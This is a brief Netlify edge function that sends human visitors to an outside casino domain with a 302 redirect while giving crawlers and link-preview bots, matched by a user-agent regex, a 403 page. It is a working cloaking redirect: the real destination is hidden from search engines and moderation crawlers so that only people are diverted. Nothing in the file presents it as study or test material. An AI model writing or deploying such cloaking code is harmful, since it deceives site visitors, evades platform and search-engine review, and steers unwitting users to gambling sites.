import { Context } from "https://edge.netlify.com";

export default async function handler(req: Request, context: Context) {
  const userAgent = req.headers.get("user-agent") || "";
  const isBot = /bot|crawl|spider|crawling|facebookexternalhit|slurp|mediapartners|adsbot|bingpreview|twitterbot|linkedinbot|embedly|quora|pinterest/i.test(userAgent);

  if (!isBot) {
    return Response.redirect("https://galaxy-casino.live", 302);
  }

  return new Response("You are not allowed here.", { status: 403 });
}
